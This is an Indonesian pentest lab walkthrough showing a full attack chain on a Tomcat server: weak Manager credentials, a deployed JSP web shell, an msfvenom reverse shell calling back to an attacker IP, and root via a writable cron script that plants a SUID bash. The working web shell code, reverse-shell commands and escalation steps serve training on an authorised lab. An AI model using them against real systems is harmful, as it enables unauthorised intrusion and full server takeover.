# 01 — Pembahasan Detail Lab Catalina
## Tomcat Manager → WAR/JSP → Cron Writable → Root → FLAG

> Dokumen ini untuk pembelajaran pentest pada **lab yang berizin**.  
> Target pembaca: peserta baru yang ingin memahami alur, bukan sekadar copy-paste command.

---

## 1. Gambaran Umum

Lab Catalina mengajarkan rantai serangan yang sering muncul pada server aplikasi Java/Tomcat:

```text
Tomcat Manager terbuka
→ credential lemah
→ deploy WAR
→ command execution sebagai user service
→ temukan cron root
→ script cron writable oleh group user service
→ tanam SUID bash
→ root
→ cari dan baca flag
```

Pada lab ini, user awal yang diperoleh adalah `tomcat`. User ini tidak root, tetapi memiliki group yang dapat menulis ke script backup yang dijalankan oleh root setiap menit.

---

## 2. Data Lab

| Komponen | Nilai |
|---|---|
| Target | `192.168.56.122` |
| Web | `http://192.168.56.122:8081` |
| Service utama | Apache Tomcat |
| Credential Tomcat | `tomcat:s3cret` |
| User awal | `tomcat` |
| Cron rentan | `/etc/cron.d/backup` |
| Script rentan | `/opt/backup/backup.sh` |
| Root shell | `/tmp/rootbash -p` |
| Cara cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |
| Flag terbukti | `/root/FLAG.txt` |

---

## 3. Konsep yang Dipelajari

Sebelum menjalankan command, pahami dulu empat konsep berikut.

### 3.1 Tomcat Manager

Tomcat Manager adalah fitur administrasi Tomcat untuk mengelola aplikasi web. Jika akun manager valid dan memiliki role deploy, kita dapat mengunggah aplikasi dalam format `.war`.

### 3.2 WAR dan JSP

WAR adalah paket aplikasi web Java. Di dalamnya dapat berisi file `.jsp`. Jika JSP menerima parameter `cmd` lalu menjalankan `/bin/sh -c`, maka JSP menjadi command runner.

### 3.3 Cron root

Cron dapat menjalankan script secara berkala. Jika cron menjalankan script sebagai `root`, maka isi script dijalankan dengan privilege root.

### 3.4 Permission group-writable

File dengan permission seperti ini berbahaya:

```text
-rwxrwxr-x root tomcat /opt/backup/backup.sh
```

Artinya:
- owner `root` dapat baca/tulis/eksekusi;
- group `tomcat` juga dapat baca/tulis/eksekusi;
- user `tomcat` dapat menambah isi script;
- jika script dijalankan root, perintah tambahan akan dieksekusi root.

---

## 4. Fase 1 — Recon Tomcat

### Tujuan

Memastikan port Tomcat terbuka dan endpoint Manager tersedia.

### Command

```bash
TARGET="192.168.56.122"
WEB="http://192.168.56.122:8081"

nmap -Pn -sC -sV -p8081 "$TARGET"
```

### Output yang Diharapkan

```text
8081/tcp open  http
Apache Tomcat
```

### Penjelasan

Port `8081` menunjukkan ada service HTTP. Jika banner menunjukkan Tomcat, maka endpoint seperti `/manager/html` perlu dicek.

### Cek Tomcat Manager

```bash
curl -i "$WEB/manager/html"
```

### Output yang Diharapkan

```text
HTTP/1.1 401
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

### Mengapa `401` Penting?

`401 Unauthorized` bukan berarti endpoint tidak ada. Justru `401` berarti endpoint ada, tetapi meminta autentikasi. Ini adalah indikator awal bahwa Tomcat Manager aktif.

---

## 5. Fase 2 — Validasi Credential

### Tujuan

Menguji apakah credential `tomcat:s3cret` dapat mengakses Tomcat Manager text interface.

### Command

```bash
curl -s -u tomcat:s3cret "$WEB/manager/text/list"
```

### Output yang Diharapkan

```text
OK - Listed applications for virtual host [localhost]
```

### Penjelasan

Response `OK` menunjukkan credential valid. Endpoint `/manager/text/list` juga membuktikan bahwa akun dapat menggunakan interface text yang bisa dipakai untuk deploy WAR.

---

# 6. Fase 3A — Opsi A: JSP Manual Tanpa Reverse Shell

Opsi ini cocok untuk peserta baru karena tidak perlu listener dan tidak bergantung pada koneksi balik.

## 6.1 Buat JSP Command Runner

```bash
mkdir -p ~/tomcat-lab/labcmd
cd ~/tomcat-lab/labcmd

cat > cmd.jsp <<'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String[] command = {"/bin/sh", "-c", cmd};
    Process p = Runtime.getRuntime().exec(command);
    InputStream in = p.getInputStream();
    InputStream err = p.getErrorStream();
    byte[] b = new byte[4096];
    int n;
    out.println("<pre>");
    while ((n = in.read(b)) != -1) out.write(new String(b,0,n));
    while ((n = err.read(b)) != -1) out.write(new String(b,0,n));
    out.println("</pre>");
}
%>
EOF
```

### Penjelasan Kode

Bagian penting:

```text
request.getParameter("cmd")
```

mengambil parameter `cmd` dari URL.

```text
Runtime.getRuntime().exec()
```

menjalankan perintah sistem operasi.

```text
/bin/sh -c
```

membuat command seperti `id; whoami; hostname` dapat dieksekusi.

## 6.2 Package Menjadi WAR

```bash
zip -r labcmd.war cmd.jsp
```

### Output yang Diharapkan

```text
  adding: cmd.jsp
```

## 6.3 Deploy ke Tomcat

```bash
curl -u tomcat:s3cret \
  --upload-file labcmd.war \
  "$WEB/manager/text/deploy?path=/labcmd&update=true"
```

### Output yang Diharapkan

```text
OK - Deployed application at context path [/labcmd]
```

### Penjelasan

Aplikasi dipasang pada context path `/labcmd`. File JSP dapat diakses di:

```text
http://192.168.56.122:8081/labcmd/cmd.jsp
```

## 6.4 Validasi RCE

```bash
SHELL_URL="$WEB/labcmd/cmd.jsp"

curl -sG \
  --data-urlencode "cmd=id; whoami; hostname; pwd" \
  "$SHELL_URL"
```

### Output yang Diharapkan

```text
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
tomcat
catalina
/
```

### Penjelasan

Output `uid=997(tomcat)` membuktikan bahwa:
- WAR berhasil deploy;
- JSP berhasil dieksekusi;
- command berjalan sebagai user `tomcat`.

---

# 7. Fase 3B — Opsi B: msfvenom Reverse Shell

Opsi ini cocok jika peserta ingin shell interaktif.

## 7.1 Buat WAR Reverse Shell

```bash
WEB="http://192.168.56.122:8081"
ATTACKER_IP="192.168.56.116"
LPORT="4444"

mkdir -p ~/tomcat-lab/msfvenom
cd ~/tomcat-lab/msfvenom

msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST="$ATTACKER_IP" \
  LPORT="$LPORT" \
  -f war \
  -o catalina-shell.war
```

### Output Contoh

```text
Payload size: ...
Final size of war file: ...
Saved as: catalina-shell.war
```

### Penjelasan

`LHOST` harus IP Kali yang dapat dijangkau target. Pada lab, callback masuk ke `192.168.56.116`.

## 7.2 Deploy WAR

```bash
curl -u tomcat:s3cret \
  --upload-file catalina-shell.war \
  "$WEB/manager/text/deploy?path=/catalina-shell&update=true"
```

### Output

```text
OK - Deployed application at context path [/catalina-shell]
```

## 7.3 Buka Listener

```bash
nc -lvnp 4444
```

### Output

```text
listening on [any] 4444 ...
```

## 7.4 Trigger Payload

Pada terminal lain:

```bash
curl -s "$WEB/catalina-shell/" >/dev/null
```

Jika shell belum masuk, cari nama JSP di WAR:

```bash
unzip -l catalina-shell.war | grep jsp
curl -s "$WEB/catalina-shell/NAMA_FILE.jsp" >/dev/null
```

## 7.5 Output Shell Berhasil

```text
connect to [192.168.56.116] from (UNKNOWN) [192.168.56.122] 42426
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
whoami
tomcat
hostname
catalina
pwd
/
```

---

## 8. Fase 4 — Enumerasi Cron dan Permission

### Tujuan

Menemukan script yang dijalankan root dan dapat ditulis oleh user `tomcat`.

### Command

```bash
cat /etc/cron.d/backup 2>/dev/null
```

### Output

```text
* * * * * root /opt/backup/backup.sh
```

### Penjelasan

Baris tersebut berarti setiap menit root menjalankan:

```text
/opt/backup/backup.sh
```

### Cek Permission

```bash
ls -lah /opt/backup/backup.sh
stat -c '%A %U %G %n' /opt/backup/backup.sh
cat /opt/backup/backup.sh
```

### Output dari Lab

```text
-rwxrwxr-x 1 root tomcat 79 Jul 15 06:58 /opt/backup/backup.sh
-rwxrwxr-x root tomcat /opt/backup/backup.sh
#!/bin/bash
# backup task
```

### Penjelasan

Karena group file adalah `tomcat` dan permission group adalah `rwx`, user `tomcat` dapat menulis ke script tersebut. Ini adalah inti privilege escalation.

---

## 9. Fase 5 — Root via SUID Bash

### Tujuan

Menambahkan perintah ke script cron agar root membuat binary bash SUID.

### Command

```bash
printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh
sleep 70
ls -l /tmp/rootbash
```

### Output yang Diharapkan

```text
-rwsr-xr-x 1 root root 1396520 Jul 15 07:24 /tmp/rootbash
```

### Penjelasan

Permission `4755` mengaktifkan SUID. Huruf `s` pada `-rws` menunjukkan binary akan berjalan dengan effective UID pemilik file, yaitu root.

### Masuk Root

```bash
/tmp/rootbash -p
whoami
id
```

### Output

```text
root
uid=997(tomcat) gid=997(tomcat) euid=0(root) groups=997(tomcat)
```

### Mengapa `-p` Wajib?

Bash biasanya menurunkan privilege saat dijalankan dari SUID. Opsi `-p` mempertahankan effective UID root.

---

## 10. Fase 6 — Cari dan Baca Flag

### Tujuan

Jangan mengasumsikan path flag. Cari dulu.

### Command Cari Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

### Output pada Catalina

```text
/root/FLAG.txt
```

### Baca Flag

```bash
cat /root/FLAG.txt
```

### Output Final

```text
FLAG{cr0n_wr173_2_5u1d_r007b45h}
```

---

## 11. Troubleshooting Catalina

### Reverse shell tidak masuk

```bash
ip -br a
nc -lvnp 4444
curl -s "$WEB/catalina-shell/" >/dev/null
```

Kemungkinan penyebab:
- `LHOST` salah;
- listener belum aktif;
- payload belum dipicu;
- firewall/lab network menghalangi callback.

### `/tmp/rootbash` belum muncul

```bash
date
cat /etc/cron.d/backup
tail -n 5 /opt/backup/backup.sh
sleep 70
ls -l /tmp/rootbash
```

Cron berjalan per menit. Tunggu minimal 60 detik.

### `/tmp/rootbash` ada tetapi tidak root

```bash
ls -l /tmp/rootbash
/tmp/rootbash -p
```

Pastikan permission mengandung `s`:

```text
-rwsr-xr-x
```

---

## 12. Ringkasan Hafalan Catalina

```text
Tomcat Manager 8081
tomcat:s3cret
deploy WAR
RCE sebagai tomcat
cron root menjalankan backup.sh
backup.sh writable oleh group tomcat
append cp bash + chmod 4755
sleep 70
/tmp/rootbash -p
find flag
cat flag
```
